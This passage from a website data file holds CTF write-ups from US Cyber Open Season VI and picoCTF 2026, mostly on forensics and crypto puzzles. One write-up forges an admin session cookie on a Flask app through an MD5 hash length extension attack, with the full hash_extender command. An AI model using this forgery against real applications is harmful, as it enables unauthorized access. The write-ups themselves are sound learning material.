<pre><code>[Restricted] Q3 Senior Intern Coordination Notes
...
SVIUSCG{[flag]}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{[flag]}</code></pre>`
      },
      {
        slug: 'photo-fraud',
        title: 'Photo Fraud',
        category: 'forensics',
        description: "Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look.",
        content: `<h2>Photo Fraud — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look."
</blockquote>
<p class="lead">The CTF description is saying that the photo was edited. The classic move for catching this kind of edit: check the EXIF thumbnail, because editors love to update the main image and forget the preview buried inside the metadata.</p>

<h3>Why This Trick Works</h3>
<p>JPEG files can carry a small embedded preview thumbnail inside their EXIF (APP1) metadata. When someone edits a photo, the editor usually rewrites the main image data but leaves that old thumbnail completely untouched — which means the thumbnail can still show what the photo looked like <em>before</em> the edit happened.</p>
<p>A normal JPEG starts with <code>FF D8</code> (Start of Image) and ends with <code>FF D9</code> (End of Image). If a second <code>FF D8</code> shows up somewhere inside the file, that's a strong sign there's a nested JPEG hiding in the metadata — almost always a thumbnail.</p>

<h3>Finding the Hidden Thumbnail</h3>
<p>Stepping through <code>challenge.jpg</code> byte by byte:</p>
<ul>
  <li>The main JPEG starts at offset <code>0</code>, as you'd expect (<code>FF D8</code>).</li>
  <li>A second <code>FF D8</code> appears at offset 86 — sitting inside the EXIF block, this is our embedded thumbnail.</li>
  <li>That thumbnail's own <code>FF D9</code> terminator shows up at offset 59839.</li>
</ul>
<p>So the thumbnail is simply bytes 86 through 59839. Carving it out:</p>
<pre><code class="language-python">with open("challenge (1).jpg", "rb") as f:
    data = f.read()

thumbnail = data[86:59840]

with open("thumbnail_challenge.jpg", "wb") as out:
    out.write(thumbnail)</code></pre>

<h3>Flag Recovery</h3>
<p>Opening up <code>thumbnail_challenge.jpg</code> shows the shop the way it looked <em>before</em> the edit — the window that's shattered in the main image is completely intact in the thumbnail, with a sign hanging in it that has the flag written right on it.</p>

<h3>Flag</h3>
<pre><code>SVIUSCG{meridian_thumbnail_reveal_garret}</code></pre>`
      },
      {
        slug: 'lost-in-translation',
        title: 'Lost in Translation 🌍',
        category: 'web',
        description: 'Only the admin can read the master vault — but the developer thought a quick MD5 signature would be plenty to keep guests out. Can you read the vault?',
        content: `<h2>Lost in Translation 🌍 — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Welcome to Lost in Translation, a tiny travel-notes app from a wanderer who wanted to keep memories of every country she's visited. Only the admin can read the master vault — but the developer thought a quick MD5 signature would be plenty to keep guests out. Can you read the vault?"
</blockquote>
<p class="lead">A small Flask app that signs its session cookies with MD5.</p>

<h3>How Sessions Get Signed</h3>
<p>The relevant chunk of the source code:</p>
<pre><code class="language-python">def sign_session(data: bytes) -> str:
    """Sign session data with a secret prefix. MD5(SECRET || data)."""
    return hashlib.md5(SECRET + data).hexdigest()

def verify_session(data: bytes, signature: str) -> bool:
    """Verify a session signature."""
    expected = sign_session(data)
    return expected == signature
</code></pre>
<p>This is the classic <code>MD5(secret || data)</code> pattern. Because MD5 is built on the Merkle-Damgård construction, it's vulnerable to a hash length extension attack: given a valid <code>(data, signature)</code> pair, you can compute a valid signature for <code>data || padding || extra</code> — without ever knowing the secret itself.</p>
<p>Look at how the session string gets parsed:</p>
<pre><code class="language-python">def parse_session(raw: str):
    """Parse a session string of the form 'key1=val1&key2=val2&...' into a dict."""
    result = {}
    for part in raw.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            result[k] = v
    return result
</code></pre>
<p>It splits on <code>&</code> and processes the pairs left to right, so whatever comes <em>last</em> wins. If we can tack <code>&role=admin</code> onto the end of our session, it'll silently override whatever <code>role</code> was set during login.</p>

<h3>Doing the Length Extension</h3>
<p>Log in as any throwaway guest account — for example my usual username, <code>SurfyCamp84</code>. The server hands back two cookies:</p>
<ul class="list-disc pl-6 space-y-2 mb-4">
  <li>session: <code>757365723d537572667943616d70383426726f6c653d6775657374</code> (hex for <code>user=SurfyCamp84&role=guest</code>)</li>
  <li>sig: <code>7708d4997696c7ad397925c83c92065e</code></li>
</ul>
<p>We want to append <code>&role=admin</code> (hex: <code>26726f6c653d61646d696e</code>). <code>hash_extender</code> (a tool I found on GitHub for hash extending) can do all the MD5 padding math for us — since we don't know the secret's length, just try different lengths. First we compile the tool and then run:</p>
<pre><code class="language-bash">./hash_extender \\
  -d 757365723d537572667943616d70383426726f6c653d6775657374 --data-format hex \\
  -s 7708d4997696c7ad397925c83c92065e \\
  -a 26726f6c653d61646d696e --append-format hex \\
  -f md5 --secret-min 1 --secret-max 30 \\
  --out-data-format hex --table</code></pre>
<p>This produces a forged session string (padding included) and a matching MD5 signature for every possible secret length from 1 to 30 bytes.</p>

<h3>Finding the Right Length</h3>
<p>From here it's just trial and error — write each session/signature pair into cookies and try the combinations until one works. The secret turns out to be 16 bytes long. With those forged cookies set, the page now renders as if we're logged in as admin.</p>

<h3>Flag</h3>
<p>The admin-only vault page shows the flag once we're authenticated:</p>
<pre><code>SVIUSCG{[flag]}</code></pre>`
      }
    ],
  },

  // ── picoCTF 2026 ─────────────────────────────────────────────────────
  {
    slug: 'picoctf-2026',
    name: 'picoCTF 2026',
    date: 'March 2026',
    description: 'The annual beginner-friendly CTF hosted by Carnegie Mellon University. Played with oveM cek.',
    teamName: 'oveM cek',
    placement: '1630th',
    totalTeams: 10000,
    challenges: [
      {
        slug: 'stegorsa',
        title: 'StegoRSA',
        category: 'crypto',
        description: 'A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?',
        content: `<h2>StegoRSA — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?"</blockquote>
<p class="lead">We're given an image and an encrypted file, <code>flag.enc</code>. No public key anywhere — but the prompt is pretty clearly hinting that the private key is hiding somewhere inside the image.</p>

<h3>Checking the Metadata</h3>
<p>First move for any stego-flavored image challenge: run <code>exiftool</code> on it. Sure enough, the "Comment" field is way too long to be an actual comment — it's a big hex blob:</p>
<pre><code class="language-bash">$ exiftool image.jpg
...
Comment                         : 2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d...</code></pre>

<h3>Decoding the Key</h3>
<p>That hex string is ASCII underneath — decode the first few bytes and you get <code>-----BEGIN RSA PRIVATE KEY-----</code>. So the whole Comment field is a hex-encoded PEM private key. Pull it out and decode it back to bytes:</p>
<pre><code class="language-bash">cat comment.txt | xxd -r -p > key.pem</code></pre>
<p><code>key.pem</code> now opens up as a normal RSA private key file.</p>

<h3>Decrypting the Flag</h3>
<p>With the key in hand, OpenSSL handles the rest:</p>
<pre><code class="language-bash">openssl pkeyutl -decrypt -inkey key.pem -in flag.enc -out flag.txt</code></pre>
<p><code>flag.txt</code> contains the plaintext flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{rs4_k3y_1n_1mg_[instance_id]}</code></pre>`
      },
      {
        slug: 'shared-secrets',
        title: 'Shared Secrets',
        category: 'crypto',
        description: 'A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?',
        content: `<h2>Shared Secrets — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?"</blockquote>
<p class="lead">A Diffie-Hellman exchange where, true to the challenge title, one side leaked something they really shouldn't have.</p>

<h3>The Setup</h3>
<p>Standard DH: a public base <code>g</code> and prime modulus <code>p</code>. Alice publishes <code>A = g^a mod p</code>, Bob publishes <code>B = g^b mod p</code>, and the shared secret is <code>S = A^b mod p = B^a mod p</code>. The flag itself is encrypted with a single-byte XOR key derived straight from that secret:</p>
<p><code>xor_key = shared_secret % 256</code></p>

<h3>Spotting the Leak</h3>
<p>Inside <code>message.txt</code>, Bob's private exponent <code>b</code> got logged somewhere it really shouldn't have been. With <code>b</code>, Alice's public value <code>A</code>, and the modulus <code>p</code> all available to us, we can compute the shared secret ourselves — Alice's private key never needs to enter the picture.</p>

<h3>Solving It</h3>
<pre><code class="language-python"># Recovered parameters
p = [MODULUS_VALUE]
g = [BASE_VALUE]
A = [ALICE_PUBLIC_KEY]
b = [LEAKED_BOB_PRIVATE_KEY]  # The leaked secret

# Calculate the shared secret
shared_secret = pow(A, b, p)
xor_key = shared_secret % 256

# Decrypt the encrypted flag bytes
encrypted_flag = bytes.fromhex("[ENCRYPTED_FLAG_HEX]")
flag = bytes([byte ^ xor_key for byte in encrypted_flag])
print(flag.decode())</code></pre>
<p>Run it, and the flag comes straight out.</p>

<h3>Flag</h3>
<pre><code>picoCTF{dh_s3cr3t_[instance_id]}</code></pre>`
      },
      {
        slug: 'binary-digits',
        title: 'Binary Digits',
        category: 'forensics',
        description: "This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?",
        content: `<h2>Binary Digits — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?"</blockquote>
<p class="lead"><code>digits.bin</code> is exactly what it says on the tin — a text file containing nothing but the characters <code>1</code> and <code>0</code>. If that's a raw bitstream for some other file, we should be able to rebuild it.</p>

<h3>Turning Bits Back Into Bytes</h3>
<p>Group the characters into chunks of 8 and convert each chunk back into a byte:</p>
<pre><code class="language-python">with open("digits.bin", "r") as f:
    bits = f.read().replace(" ", "").replace("\\n", "")

data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

with open("recovered_file.jpg", "wb") as f:
    f.write(data)</code></pre>
<p>(CyberChef's "From Binary" recipe does the same thing if scripting isn't your thing.)</p>

<h3>So What Did We Get?</h3>
<p>Looking at the first few bytes of the recovered file: <code>FF D8 FF E0</code> — the magic bytes for a JPEG. Rename it with a <code>.jpg</code> extension and open it up.</p>

<h3>Flag</h3>
<p>The flag is written directly on the recovered image.</p>
<pre><code>picoCTF{h1dd3n_1n_th3_b1n4ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-1',
        title: 'Timeline 1',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 1 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Just a disk image and a vague "find the flag" — classic setup for a "build a timeline and look for the thing that doesn't belong" challenge, which is most of what DFIR work actually looks like in practice.</p>

<h3>Sorting Out the Partition</h3>
<p>If the image has multiple partitions, <code>mmls</code> or <code>fdisk</code> will tell us which one actually has the filesystem we care about.</p>

<h3>Building the Timeline</h3>
<p>The Sleuth Kit makes this part painless. First, dump metadata and timestamps for every file — including deleted ones — with <code>fls</code>:</p>
<pre><code class="language-bash">fls -r -m / partition.img > body.txt</code></pre>
<p>Then run that through <code>mactime</code> to get a sorted, human-readable CSV:</p>
<pre><code class="language-bash">mactime -b body.txt > timeline.csv</code></pre>

<h3>Looking for the Odd One Out</h3>
<p>Scanning down <code>timeline.csv</code>, what we're looking for is a cluster of events that doesn't fit the pattern — usually a file getting touched right around the same time something else gets deleted or wiped. One file matches that exactly: it gets deleted moments after what looks like a cleanup script runs. Note down its inode number.</p>

<h3>Carving It Back Out</h3>
<p>Deleted doesn't mean gone on most filesystems — the blocks usually just sit there until something overwrites them. Pull the file content back with <code>icat</code> and the inode number we found:</p>
<pre><code class="language-bash">icat partition.img &lt;target_inode&gt; > extracted_file.txt</code></pre>
<p>And there's our flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{573417h13r_7h4n_7h3_1457_[instance_id]}</code></pre>`
      },
      {
        slug: 'timeline-0',
        title: 'Timeline 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
        content: `<h2>Timeline 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
<p class="lead">Same general idea as Timeline 1, except this time whoever planted the flag tried to cover their tracks with timestomping — manually rewriting a file's MACB timestamps to throw off anyone building a timeline.</p>

<h3>Building the Timeline</h3>
<p>Same Sleuth Kit workflow as before:</p>
<pre><code class="language-bash">fls -r -m / partition4.img > output.txt
mactime -b output.txt > timeline.txt</code></pre>

<h3>The Giveaway</h3>
<p>Timestomping tends to stick out the moment you sort by date, because someone has to actually pick a fake timestamp, and people aren't great at picking convincing ones. Running <code>head timeline.txt</code> on the sorted output, the oldest entry in the whole image is <code>/bin/bcab</code>, dated January 02, 1985. A binary in <code>/bin</code> that predates this entire CTF by four decades is, to put it gently, not normal.</p>

<h3>Pulling the File</h3>
<p>Grab the inode for <code>/bin/bcab</code> — in this case <code>4945</code> — and carve it out the same way as before:</p>
<pre><code class="language-bash">icat partition4.img 4945 > bcab.txt</code></pre>
<p><code>bcab.txt</code> has the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{71m311n3_0u7113r_h3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'rogue-tower',
        title: 'Rogue Tower',
        category: 'forensics',
        description: 'A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag.',
        content: `<h2>Rogue Tower — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A suspicious cell tower has been detected in the network. Analyze the captured network traffic to identify the rogue tower, find the compromised device, and recover the exfiltrated flag."</blockquote>
<p class="lead">A PCAP, and a hint that there's a rogue cell tower beaconing somewhere with a compromised device talking back to it.</p>

<h3>First Pass</h3>
<p>Opening the capture in Wireshark, two things jump out almost immediately:</p>
<ul>
  <li>A steady stream of UDP broadcasts on port <code>55000</code> — almost certainly our rogue tower announcing itself.</li>
  <li>A series of HTTP POST requests, split across multiple packets, each carrying a base64 chunk and heading out to an external IP.</li>
</ul>

<h3>Identifying the Compromised Device</h3>
<p>Filtering on <code>http.request.method == "POST"</code> and checking the headers, the <code>User-Agent</code> string on these requests includes the device's details along with its IMSI (International Mobile Subscriber Identity) — that's our compromised phone.</p>

<h3>Decrypting the Exfiltrated Data</h3>
<p>The POST bodies are base64 fragments of one larger payload — concatenate them all together first. The encryption is a simple XOR, keyed off the device's IMSI:</p>
<pre><code class="language-python"># Concatenated Base64 segments
ciphertext_b64 = "..."
ciphertext = base64.b64decode(ciphertext_b64)

# Key derived from IMSI
imsi_key = b"IMSI_STRING_HERE"

# XOR Decryption
flag = bytes([ciphertext[i] ^ imsi_key[i % len(imsi_key)] for i in range(len(ciphertext))])
print(flag.decode())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{r0gu3_c3ll_t0w3r_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-2',
        title: 'Forensics Git 2',
        category: 'forensics',
        description: "The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?",
        content: `<h2>Forensics Git 2 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The agents interrupted the perpetrator's disk deletion routine. Can you recover this git repo?"</blockquote>
<p class="lead">A git repo where someone tried to wipe their tracks by deleting branches and clearing the reflog. Good news: that doesn't actually delete the underlying objects.</p>

<h3>Why the Data Is Still There</h3>
<p>Every commit, tree, and blob in Git is stored as its own zlib-compressed object under <code>.git/objects</code>, addressed by hash. Deleting a branch ref or clearing the reflog only removes the <em>pointers</em> to those objects — the objects themselves stick around as "dangling" until something actually runs garbage collection. So even though <code>git log</code> and <code>git reflog</code> come back empty, what we're after is most likely still sitting in <code>.git/objects</code>.</p>

<h3>Dumping the Whole Object Database</h3>
<p>Instead of manually inflating every object one at a time, <code>git cat-file</code> can walk the entire object store for us in one shot:</p>
<pre><code class="language-bash">git cat-file --batch-all-objects --batch | strings > all_objects.txt</code></pre>
<p>This spits out the readable content of every object Git knows about — dangling or not.</p>

<h3>Finding the Flag</h3>
<p>From here it's just a grep through the dump:</p>
<pre><code class="language-bash">grep -oE "picoCTF\\{.*\\}" all_objects.txt</code></pre>
<p>...and the flag turns up, sitting inside one of those orphaned blob objects.</p>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_d4ngl1ng_0bj3cts_r3c0v3ry_[instance_id]}</code></pre>`
      },
      {
        slug: 'forensics-git-0',
        title: 'Forensics Git 0',
        category: 'forensics',
        description: 'Can you find the flag in this disk image?',
        content: `<h2>Forensics Git 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Can you find the flag in this disk image?"
</blockquote>
<p class="lead">The intro challenge in the Git forensics series — a disk image containing a repo, and a file that's been removed from the working tree but is still sitting safely in history.</p>

<h3>Mounting the Partition</h3>
<p>First, figure out where the partition actually starts:</p>
<pre><code class="language-bash">fdisk -l disk.img</code></pre>
<p>Multiply the start sector by the sector size (usually 512 bytes) to get the byte offset, then mount it read-only:</p>
<pre><code class="language-bash">sudo mount -o loop,offset=&lt;calculated_offset&gt; disk.img /mnt/ctf</code></pre>

<h3>Looking at the Repo History</h3>
<p>There's a repo sitting at <code>/mnt/ctf/home/ctf-player/Code/secrets/.git</code>, and since it's intact, normal git commands work fine. Checking the log:</p>
<pre><code class="language-bash">git log --stat</code></pre>
<p>One of the commits removes a file called <code>secret_flag.txt</code> — exactly what we're after.</p>

<h3>Getting the File Back</h3>
<p>Just check out the commit right before that deletion:</p>
<pre><code class="language-bash">git checkout &lt;commit_hash&gt;
cat secret_flag.txt</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_h1st0ry_r3v3al_[instance_id]}</code></pre>`
      },
      {
        slug: 'disko-4',
        title: 'DISKO 4',
        category: 'forensics',
        description: 'Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!',
        content: `<h2>DISKO 4 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Can you find the flag in this disk image? This time I deleted the file! Let see you get it now!"
</blockquote>
<p class="lead">Same disk-image-with-a-flag setup as the rest of the DISKO series, except this time the file's been deleted. On ext4, "deleted" mostly just means the inode and its blocks have been marked free — the actual data is usually still sitting there until something overwrites it.</p>

<h3>Listing Deleted Files</h3>
<p>The Sleuth Kit's <code>fls -d</code> flag lists only deleted entries:</p>
<pre><code class="language-bash">fls -r -d disko-4.dd</code></pre>
<p>One entry catches the eye right away:</p>
<p><code>* d/d 532021:   log/dont-delete.gz</code></p>
<p>A file literally called "dont-delete" that's immediately... deleted. Checks out for a CTF. Inode <strong>532021</strong> is our target.</p>

<h3>Carving It Out</h3>
<pre><code class="language-bash">icat disko-4.dd 532021 > recovered.gz</code></pre>

<h3>Unpacking and Reading It</h3>
<pre><code class="language-bash">gunzip recovered.gz
cat recovered</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{d3l_d0n7_h1d3_w3ll_[instance_id]}</code></pre>`
      },
      {
        slug: 'cryptomaze',
        title: 'cryptomaze',
        category: 'crypto',
        description: 'In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.\\n\\nThe flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it.',
        content: `<h2>cryptomaze — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.<br/><br/>
The flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it."
</blockquote>
<p class="lead">An AES-encrypted flag where the AES key itself comes out of an LFSR. We're given the LFSR's seed and tap positions, so really this challenge boils down to "simulate the LFSR correctly, then decrypt."</p>

<h3>Simulating the LFSR</h3>
<p>An LFSR works by shifting its state on every clock, XOR-ing together the bits at the configured tap positions to get a feedback bit, and popping off whichever bit falls out the end. Clock it 128 times and collect everything that gets popped:</p>
<pre><code class="language-python"># LFSR Parameters (from challenge code)
state = [SEED_BITS]
taps = [TAP_INDICES]
popped_bits = []

for _ in range(128):
    feedback = 0
    for tap in taps:
        feedback ^= state[tap]
    popped_bits.append(state[0])
    state = state[1:] + [feedback]</code></pre>

<h3>Turning That Into an AES Key</h3>
<p>128 bits happens to be exactly one AES-128 key's worth — group them into 8-bit chunks and convert each to a byte:</p>
<pre><code class="language-python">key_bytes = []
for i in range(0, 128, 8):
    byte_bits = popped_bits[i:i+8]
    byte_val = int("".join(map(str, byte_bits)), 2)
    key_bytes.append(byte_val)
key = bytes(key_bytes)</code></pre>

<h3>Decrypting</h3>
<p>With the key derived, AES-ECB decryption via pycryptodome gives us the flag:</p>
<pre><code class="language-python">from Crypto.Cipher import AES

ciphertext = bytes.fromhex("[CIPHERTEXT_HEX]")
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext.strip())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{lfsr_m4z3_d3crypt3d_[instance_id]}</code></pre>`
      }
    ],
  },
];

// ---------------------------------------------------------------------------
// Query Helpers
// ---------------------------------------------------------------------------

/** All CTF events, newest first (based on chronological month ordering). */
export function getCTFEvents(): CTFEvent[] {
  const monthOrder: Record<string, number> = {
    January: 1,
    February: 2,
    March: 3,
    April: 4,
    May: 5,
    June: 6,
    July: 7,
    August: 8,
    September: 9,
    October: 10,
    November: 11,
    December: 12,
  };

  return [...ctfEvents].sort((a, b) => {
    const [monthA, yearA] = a.date.split(' ');
    const [monthB, yearB] = b.date.split(' ');

    const yDiff = Number(yearB) - Number(yearA);
    if (yDiff !== 0) return yDiff;

    return (monthOrder[monthB] ?? 0) - (monthOrder[monthA] ?? 0);
  });
}

/** Look up a single CTF event by its slug. */
export function getCTFBySlug(slug: string): CTFEvent | undefined {
  return ctfEvents.find((e) => e.slug === slug);
}

/** Look up a single challenge inside a CTF. */
export function getChallengeBySlug(
  ctfSlug: string,
  challengeSlug: string,
): { ctf: CTFEvent; challenge: Challenge } | undefined {
  const ctf = getCTFBySlug(ctfSlug);
  if (!ctf) return undefined;

  const challenge = ctf.challenges.find((c) => c.slug === challengeSlug);
  if (!challenge) return undefined;

  return { ctf, challenge };
}

/** Flat list of every challenge, annotated with its parent CTF info. */
export function getAllChallenges(): (Challenge & { ctfSlug: string; ctfName: string })[] {
  return getCTFEvents().flatMap((ctf) =>
    ctf.challenges.map((ch) => ({
      ...ch,
      ctfSlug: ctf.slug,
      ctfName: ctf.name,
    })),
  );
}

/** Return the N most recent challenges (from newest CTF first). */
export function getRecentChallenges(count: number) {
  return getAllChallenges().slice(0, count);
}